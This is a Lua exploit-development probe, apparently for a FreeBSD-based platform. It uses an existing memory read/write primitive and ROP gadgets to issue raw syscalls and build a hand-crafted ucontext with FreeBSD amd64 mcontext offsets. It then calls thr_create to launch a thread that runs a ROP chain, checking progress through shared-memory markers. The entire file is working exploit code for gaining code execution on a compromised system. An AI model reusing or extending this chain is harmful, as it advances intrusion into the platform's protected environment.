-- CRASH_CLASS: HIGH
-- PROBE 126e: thr_create with CORRECT FreeBSD amd64 mcontext offsets
-- Previous probes had wrong offsets. FreeBSD amd64 mcontext layout:
--   +0xA0: mc_rip, +0xA8: mc_cs, +0xB0: mc_rflags, +0xB8: mc_rsp, +0xC0: mc_ss
-- ucontext_t: uc_sigmask (16 bytes) then uc_mcontext at +0x10

print("=== PROBE 126e: THR_CREATE CORRECT OFFSETS ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local function make_sc(num)
    local sc = {}
    for k, v in pairs(syscall.pipe) do sc[k] = v end
    sc.syscall_no = num
    setmetatable(sc, getmetatable(syscall.pipe))
    return sc
end

-- First verify our ropchain syscall works
local chain_test = ropchain:new()
local sc_getpid = make_sc(20)
chain_test:push_syscall_with_ret(sc_getpid)
chain_test:restore_through_longjmp()
chain_test:execute_through_coroutine()
local test_ret = chain_test:get_last_retval_addr()
if test_ret then
    print("ropchain getpid=" .. to_num(memory.read_qword(test_ret)))
end

-- Shared proof-of-execution buffer
local shared = memory.alloc(64)
for off = 0, 56, 8 do memory.write_qword(shared + off, 0) end

-- Build thread ROP chain
-- Thread will write 0xAAAA to shared, sleep briefly, write 0xBBBB
local thread_chain = ropchain:new({stack_size = 0x8000})

-- Write proof marker
thread_chain:push_write_qword_memory(shared, uint64(0xAAAA))

-- nanosleep 200ms
local sc_nanosleep = make_sc(240)
local timespec = memory.alloc(16)
memory.write_qword(timespec, 0)
memory.write_qword(timespec + 8, 200000000) -- 200ms
thread_chain:push_syscall(sc_nanosleep, timespec)

-- Write second proof marker
thread_chain:push_write_qword_memory(shared + 8, uint64(0xBBBB))

-- thr_exit
local sc_thr_exit = make_sc(431)
thread_chain:push_syscall(sc_thr_exit, 0)
thread_chain:push_ret()

local chain_start = thread_chain.stack_base
print("thread chain=" .. tostring(chain_start))

-- Build ucontext with CORRECT FreeBSD amd64 offsets
-- mcontext starts at ucontext+0x10
-- Within mcontext:
--   +0x00: mc_onstack   +0x08: mc_rdi    +0x10: mc_rsi    +0x18: mc_rdx
--   +0x20: mc_rcx       +0x28: mc_r8     +0x30: mc_r9     +0x38: mc_rax
--   +0x40: mc_rbx       +0x48: mc_rbp    +0x50: mc_r10    +0x58: mc_r11
--   +0x60: mc_r12       +0x68: mc_r13    +0x70: mc_r14    +0x78: mc_r15
--   +0x80: mc_trapno(4) +0x84: mc_fs(2)  +0x86: mc_gs(2)
--   +0x88: mc_addr      +0x90: mc_flags(4) +0x94: mc_es(2) +0x96: mc_ds(2)
--   +0x98: mc_err
--   +0xA0: mc_rip       +0xA8: mc_cs     +0xB0: mc_rflags
--   +0xB8: mc_rsp       +0xC0: mc_ss     +0xC8: mc_len

local UC_SIZE = 0x340
local ucontext = memory.alloc(UC_SIZE)
for off = 0, UC_SIZE - 4, 4 do memory.write_dword(ucontext + off, 0) end

local mc = ucontext + 0x10  -- mcontext base

-- Set registers
memory.write_qword(mc + 0xA0, gadgets.ret)       -- mc_rip = ret (starts ROP chain)
memory.write_qword(mc + 0xA8, uint64(0x43))      -- mc_cs = USER_CS
memory.write_qword(mc + 0xB0, uint64(0x202))     -- mc_rflags = IF
memory.write_qword(mc + 0xB8, chain_start)        -- mc_rsp = thread ROP chain
memory.write_qword(mc + 0xC0, uint64(0x3B))      -- mc_ss = USER_SS
memory.write_qword(mc + 0xC8, uint64(0xC8 + 0x280)) -- mc_len = sizeof(mcontext)

-- Also set mc_flags to indicate valid context
-- _MC_HASSEGS = 0x1, _MC_HASBASES = 0x2
memory.write_dword(mc + 0x90, 0x1) -- mc_flags = _MC_HASSEGS

-- Set segment registers to valid user values
memory.write_word(mc + 0x84, 0)     -- mc_fs = 0
memory.write_word(mc + 0x86, 0)     -- mc_gs = 0
memory.write_word(mc + 0x94, 0x3B)  -- mc_es = USER_DS
memory.write_word(mc + 0x96, 0x3B)  -- mc_ds = USER_DS

-- Verify
print("mc_rip=" .. tostring(memory.read_qword(mc + 0xA0)))
print("mc_cs=" .. tostring(memory.read_qword(mc + 0xA8)))
print("mc_rflags=" .. tostring(memory.read_qword(mc + 0xB0)))
print("mc_rsp=" .. tostring(memory.read_qword(mc + 0xB8)))
print("mc_ss=" .. tostring(memory.read_qword(mc + 0xC0)))

-- Create thread
print("")
print("*** CREATING THREAD ***")
local sc_thr_create = make_sc(430)
local new_tid_buf = memory.alloc(8)
memory.write_qword(new_tid_buf, 0)

local ok, err = pcall(function()
    local chain = ropchain:new()
    chain:push_syscall_with_ret(sc_thr_create, ucontext, new_tid_buf, 0)
    chain:restore_through_longjmp()
    chain:execute_through_coroutine()
    local ret_addr = chain:get_last_retval_addr()
    if ret_addr then
        print("ret=" .. tostring(memory.read_qword(ret_addr)))
    end
end)
print("ok=" .. tostring(ok) .. " err=" .. tostring(err))

local new_tid = to_num(memory.read_qword(new_tid_buf))
print("tid=" .. new_tid)

-- Also check errno
local ok_err, err_str = pcall(get_error_string)
if ok_err then print("errno: " .. err_str) end

-- Monitor shared memory
print("")
print("--- MONITORING ---")
for i = 1, 15 do
    sleep(0.1, 's')
    local s0 = to_num(memory.read_qword(shared))
    local s8 = to_num(memory.read_qword(shared + 8))
    if s0 ~= 0 or s8 ~= 0 or i <= 3 or i == 15 then
        print(string.format("  t=%.1f: s0=0x%X s8=0x%X", i*0.1, s0, s8))
    end
    if s0 == 0xAAAA and i == 1 then
        print("  *** THREAD RUNNING! ***")
    end
    if s8 == 0xBBBB then
        print("  *** THREAD COMPLETE! ***")
        break
    end
end

local canary = pcall(function() return to_num(syscall.getpid()) end)
print("canary: " .. tostring(canary))

print("=== PROBE 126e COMPLETE ===")
